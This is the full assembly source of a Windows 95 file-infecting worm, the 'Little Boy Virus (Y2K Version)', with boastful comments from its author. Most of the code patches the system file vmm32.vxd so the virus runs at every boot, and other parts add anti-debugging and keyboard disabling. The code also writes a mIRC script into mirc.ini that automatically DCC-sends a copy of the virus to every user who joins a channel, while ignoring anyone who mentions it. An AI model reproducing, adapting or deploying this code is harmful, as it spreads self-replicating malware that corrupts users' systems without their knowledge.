;,;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;,
; Little Boy Virus (Y2K Version)
; by The Spy
; Start codin: 20/02/2000
; Finished codin: 08/03/2000
; Size: 1077 bytes (It could b less but its an example of some things,
; includin da enormous space that da vmm32.vxd brings me!! :))
; Its new, Its dirty, Itsssssssssuxs! hehe
; Y2K Compliant ;D hehehe
; For win95 only (Designed for 4.00.950 B) X`DDD
;,;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;,
;
; Da Borin Classic History:
; In da middle of 1995 i ve started codin a COM/EXE/SYS infector that
; i ve named littleboy cuz i will ve da payload in Aug 6th, 1995 in
; memory of da ppl that ve died for da atomic bomb in japan in 1945.
; I ve never finished it, n i want to bring littleboy virus back, now
; doin other things, like worm things, so here is it.
;
; New Version: 2000
; New Description:
; - Infects da win95 vmm32.vxd n it modifies da c:\mirc\mirc.ini to
;   send a copy of itself as boy95.com hehe :)
; - Anti-Debugging (las mismas boludeces de siempre :))
; - Runtime Decide, Nop Module, Garbage Module, etc
;*- Implements my new encryption method (Carry Method) ]= NO TIME ]=
;*- Antidummie Check                                   ]= NO TIME ]=
;*- Descamation                                        ]= NO TIME ]=
;*? It Implements Vampirism                      ]= NO TESTED YET ]=
; - Payload: It uses da vmm32.vxd every run to show da string
;
;              'The Spy was here! :p'
;
;AVs Detections:
;
;	- No one, of course.
;
; I know i ve not commented it as pretty well u want, but i want that
; u look in da source hehe, nice move ah? ;D
; Enjoy it :)
;
;,;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;,

.286		; a 286 runnin a win95/98? hahahaa so funny
.model tiny
.code
	org 100h

play:
	pusha

	push cs
	pop ds

;	cmp ax,bx		; what r u doin?
;	jne avanzo
;	cmp cx,dx
;	jnz avanzo
;	jmp Its_a_Dummie	; dont trace me!
;avanzo:
	mov ah,19h	; GET CURRENT DEFAULT DRIVE
	int 21h
	mov [curdriv],al; curdr:=al;

;	mov ah,47h
;	xor dx,dx
;	lea si,curdire
;	int 21h

	mov ah,0Eh	; SELECT DEFAULT DRIVE
	mov dl,2	; 'C:'
	int 21h

	mov ah,3bh	; SET CURRENT DIRECTORY
	lea dx,barra	; '\'
	int 21h

	mov ah,3Dh	; OPEN EXISTING FILE
	lea dx,fname	; 'msdos.sys'
	int 21h

;;                                   ;;
; Hey, im codin like a Mocosoft coder ;
;                  - Int 21h lover ;) ;
;;                                   ;;

	mov bx,ax	; bx:=handle;
	mov ah,3fh	; READ FROM FILE OR DEVICE
	mov cx,50	; bytes amount
	lea dx,bosta	; where r da bytes goin to?
	int 21h

	mov si,dx	; si -> bosta
	mov dx,'Dn'	; Wi'nD'ir
;	xor cx,cx	; cx goes NULL
lookfor:
;	shl ax,8	; Save da old char
	mov ah,al	; Save da old char
	lodsb		; Load da new char
	cmp dl,ah	; Its 'n' ?
	jz thatone	; Yes, it is
;	cmp al,cl	; No, Its a null?
	jnz lookfor	; No, Look for a new char
;	jmp Its_a_Dummie; Yes, there is no WinDir in msdos.sys
thatone:
	cmp dl,ah	; Its 'D' ?
	jnz lookfor	; Nope, go for da new char
	add si,6	; si ------------.
			; 'WinDir=X:\' <-'
;	lodsw		;ir
;	lodsw		;=C
;	lodsw		;:\
			; now si points to da string

	mov ah,3eh	; dont forget close da msdos.sys hehe ;P
	int 21h

	lea di,bosta	; choose recipient
other:
	lodsb		; Load byte
	cmp al,0Dh	; Its 0Dh ?
	jz stop		; Yep, Ive finished movin bytes
	stosb		; Nope, Ive to copy
	jmp other	; go for another byte
stop:
	lea si,barra		;         .----.
	mov byte ptr[si+1],53h	; put da 'S' '\SYSTEM',0
				; I save a byte ;) overwritin da null
	movsw			; copy da '\SYSTEM',0
	movsw
	movsw
	movsw
	movsb			; we need to place da null too
	mov ah,3bh		; SET CURRENT DIRECTORY
	lea dx,bosta		; WinDir + '\SYSTEM',0
	int 21h
	jnc segui
	jmp Its_a_Dummie

segui:
	mov ax,3D02h		;Open Read n Write
	lea dx,vmm32		;File Name
	int 21h			;...
	jnc Infect_VMM32	;
	jmp exit		;error? what? da system does not ve da
				;vmm32.vxd ??? well, its not a w95/98

;jumptome	db 0EAh,00h,00h,00h,00h
;jumptohim	db 0EAh,0F0h,05h,00h,00h

callmeplz:	call cs:0100h	; 2Eh,0FFh,16h,00h,01h

	;why 100h ?, cuz 500h - 400h its emm.. 100h :) shit it works :D

Infect_VMM32:

	mov ah,3Fh			;lets gonna read
	mov cx,32h
	lea dx,bosta
	int 21h

	cmp word ptr [bosta+14h],1707h	; i check if its w95 vmm32.vxd
	jz aja				; with da entry point
	jmp body			; if isnt, just getout this pc!
aja:
	mov bp,20
bp_repeat:
	mov ax,4200h	;move file pointer from file's begining
	xor cx,cx	;0000:
src:
	mov dx,0500h	;0500h
	int 21h		;DMPADMPADMPADMPADMPA..0000000000000000

	mov ah,3Fh			;lets gonna read
	mov cx,50
	lea dx,bosta
	int 21h

	cmp word ptr [bosta],0E60h	; i know, i know, its slow but
	jnz vamo			; if i place a check before da
	jmp body			; file grows too much to fit,
					; so i must place da check into
					; da bp_repeat loop DAMN!
					; it works fine 8D!
vamo:
	mov ax,4200h	;move file pointer from file's begining
	xor cx,cx	;
	inc cl		;0001:
dst:
	mov dx,219Bh	;219Bh
	int 21h		;DMPADMPADMPADMPADMPA..0000000000000000

	mov ah,40h			;lets gonna write	
	mov cx,50
	lea dx,bosta
	int 21h

	dec bp
	cmp bp,0
	jz sigasiga
	add word ptr [src+1],50
	add word ptr [dst+1],50
	jmp bp_repeat

sigasiga:

	mov ax,4200h	;move file pointer from file's begining
	xor cx,cx	;0000:
	mov dx,0500h	;0500h
	int 21h		;DMPADMPADMPADMPADMPA..0000000000000000

	mov ah,40h			;lets gonna write
	mov cx,(endplay-play)		;what im goin to write??...
	lea dx,play			;initial point
	int 21h				;to write it

	mov ax,4200h	;move file pointer from file's begining
	xor cx,cx	;0000:
	mov dx,09EBh	;09EBh
	int 21h		;DMPADMPADMPADMPADMPA..0000000000000000

	mov ah,40h		;lets gonna write
	mov cx,5		;what im goin to write??...
	lea dx,callmeplz	;initial point
	int 21h			;to write it

	mov ah,3eh	; dont forget close da vmm32.vxd too...
	int 21h

	lea si,barra		;          .----.
	mov byte ptr[si+1],00h	; put da null '\SYSTEM',0
	mov ah,3bh		; SET CURRENT DIRECTORY
	lea dx,barra		; '\'
	int 21h

;	mov ah,3bh		; SET CURRENT DIRECTORY
;	lea dx,curdire		; dx -> curdire
;	int 21h

	mov ah,0Eh		; SELECT DEFAULT DRIVE
	mov dl,[curdriv]	; dl:=curdriv;
	int 21h

	jmp body

curdriv	db	02h
fname	db	'msdos.sys',00h
barra	db	'\',0
system	db	'YSTEM',0
vmm32	db	'vmm32.vxd',00h
bosta	db	50 dup (00h)
;curdire	db	64 dup (00h)

Check_Dummie:	; No time, but im goin to code it in da future, i guess

Its_a_Dummie:
;	jmp exit

body:
	cli

	in al,21h		; Keyboard Out
	or al,02h
	out 21h,al

	push ax			; Stack Check
	pop dx
	dec sp
	dec sp
	pop cx

	sti

;	call delta
;delta:
;	pop di
;	add di,(behappy-delta+6); di:=offset behappy;
	cmp cx,dx		; its to meeeeee?
	jz behappy		; if cx=dx then im runnin ok
	mov al,90h		; else overwrite virus source with nops
				; i know its a very old trick, but who
				; cares? its pretty nasty, i like it :)
chustloop:
	stosb			; put a fuckin nop
	call listop		; yeah kewl
	jmp chustloop		; go for da next one

behappy:

	db	'THESPY'	; what da fuck r u doin?

;push sp ; 'T'
;dec ax  ; 'H'
;inc bp  ; 'E'
;push bx ; 'S'
;push ax ; 'P'
;pop cx  ; 'Y'

	add sp,4	; chust fix da stupid way to sign X`DDD

Check_Residency:	; now its a joke ;D

;,       ,;;;;;;;;;;;;;;;,;;;; TEST ONLY ;;;;,;;;;;;;;;;;;;;;,       ,;
;;;,;;;,;;;;;;;;;;;;;;;;;;; Works Great! :D ;;;;;;;;;;;;;;;;;;;,;;;,;;;

Decide_What_To_Do:
		; Random Life hehehe, this virus belives in destiny ;D
	in ax,40h	; Some Veryveryvery Stupid IA (if i can say IA)
	add al,ah	; Chust da first step, i ve think more... wait!
	shr al,4	; OK, chust test da first nibble bits
	test al,1	; 1st bit
	jnz MN		; Nop_Module
test2:
	test al,2	; 2nd bit
	jnz MG		; Garbage_Module
test4:
	test al,4	; 4th bit
	jnz PS		; Set Payload n Make da next run execute MGifMN
			; or if MGifMN then restore
test8:
	test al,8	; 8th bit
	jnz CC		; Create_COM

	jmp Exit	; Ok, now, get out of here

MN:
	call Nop_Module
	jmp test2
MG:
	call Garbage_Module
	jmp test4
PS:
	mov byte ptr [payload],01h
	cmp word ptr [test2],9090h
	jz restore
	mov word ptr [test2],9090h	; i can optimize that but i
	jmp test8			; think this way is more easy
restore:				; to understand, so it is here
	mov word ptr [test2],02A8h
	jmp test8
CC:
	call Create_COM	; It will infect mIRC also
	jmp Exit	; Ok, now, get out of here

Nop_Module:
nopdup	db	19 dup (90h)
	ret

Garbage_Module:		; hehe, Garbage_Module? Shit_Module! X`DDD
	lea di,bullshit
	mov cx,8
luphere:
	in al,40h
	stosb
	dec cx
	jnz luphere
	ret
bullshit:
damn	db	9 dup (?)

Create_COM:

	mov ah,3bh	; SET CURRENT DIRECTORY
	lea dx,mircdir	; 'c:\mirc'
	int 21h
	jc strike3

	mov ah,3Ch	; create a .com to send via irc
	xor cx,cx	;...
	lea dx,comname
	int 21h
	jc strike3

	xchg ax,bx	; bx=handle

	mov ah,40h			;lets gonna write
	mov cx,(endplay-play)		;what im goin to write??...
	lea dx,play			;initial point
	int 21h				;to write it

	mov ah,3Eh	; dont forget close da boy95.com
	int 21h

Infect_Mirc_Ini:

	lea si,mircini		; im savin a whole total of
	mov byte ptr [si-1],'m'	; 2 enormous bytes with this move X)

	mov ax,3D02h		;Open Read n Write
	lea dx,mircdir		;File Name
	int 21h			;...
	jc strike3		; damn! ive decide to dont create a new
				; mirc.ini, i think we must not say
				; 'Hello! im here!' so easy.

	xchg ax,bx	; bx=handle

mIRC_Ini_Infection_Check:

	mov ax,4202h	;to da end of da file
	xor cx,cx
	xor dx,dx
	int 21h

	xchg dx,ax	;cx:dx=filesize

	mov ax,4200h	;to da end of da file-6
	sub dx,6
	int 21h

	mov ah,3Fh	; read 2 bytes
	mov cx,2
	lea dx,mircdir	; Use it, anyway it will no affect nothing
	int 21h

	mov ax,'ci'	; checks for $n'ic'k well, it so shitty, but
	cmp word ptr [mircdir],ax	; who da fuck cares?
	je strike3

	mov ax,4202h	;to da end of da file
	xor cx,cx
	xor dx,dx
	int 21h

	mov ah,40h	; write da script
	mov cx,ak-script
	lea dx,script
	int 21h

	mov ah,3Eh	; close da file
	int 21h

strike3:
	ret	; ret to da decision module

mircdir	db	'c:\mirc\',0
mircini	db	'irc.ini',0
comname	db	'c:\mirc\boy95.com',0
script	db	13,10,'[script]',13,10
n0	db	'n0=; Little Boy Virus (Y2K Version) The Spy',13,10
n1	db	'n1=ON 1:JOIN:#:{ /if ( $nick != $me )'
	db	' { /dcc send $nick $mircdirboy95.com | '
	db	'/ignore $nick }',13,10
n2	db	'n2=ON 1:TEXT:*boy95*:*:/ignore $nick',13,10
n3	db	'n3=ON 1:TEXT:*LittleBoy*:*:/ignore $nick',13,10
n4	db	'n4=ON 1:TEXT:*LBV*:*:/ignore $nick',13,10
n5	db	'n5=ON 1:TEXT:*infect*:*:/ignore $nick',13,10
zero	db 	0
ak:	; im abusin of labels so dont tell that i dont refernce
	; clearly :]

;Infect_Pirch:
;u sure? well not implemented

;Infect_PE:
;da pe dos stub infection, nah

;Generate_SCR:
;n put it in \mirc\download, TSVT isnt finished, so wait

listop:		; why????
	ret	; cuz when ret became nop, it will exit, hehee

Exit:

	lea si,payload	; Check for payload
	xor bx,bx	; bx=00h
	inc bl		; bx=01h
	cmp byte ptr[si],bl 	;01h
	jnz GetOutNow		; if not payload then exit;
	shl bx,4		; bx=10h
	sub si,bx		;10h, now si points to author
	shl bx,1		; bx=20h
	mov byte ptr[si],bl	;20h, now put a space over da '$'
	mov ax,0900h		; thats my way
	lea dx,autor
	int 21h
GetOutNow:
	in	al,21h			; Keyboard In
	and	al,not 2
	out	21h,al

	mov ax,3D02h		;Open Read n Write
	lea dx,vmm32		;File Name
	int 21h			;...

	mov ax,4200h	;move file pointer from file's begining
	xor cx,cx	;
	inc cl		;0001:
	mov dx,219Bh	;219Bh
	int 21h		;DMPADMPADMPADMPADMPA..0000000000000000

	mov ah,3Fh			; lets gonna read
	mov cx,1050
	mov dx,0100h
	int 21h

	mov ah,3Eh
	int 21h

	popa
	ret
Virus	db	'Little Boy Virus$'
Autor	db	'The Spy$'	; 2da vz, pa los AVers idiotas
	db	'was here! :p$'
VirSize	db	0000h	; for compatibility
VirBody	db	00h	; like MS systems, u know
Payload db	00h

endplay:
end play
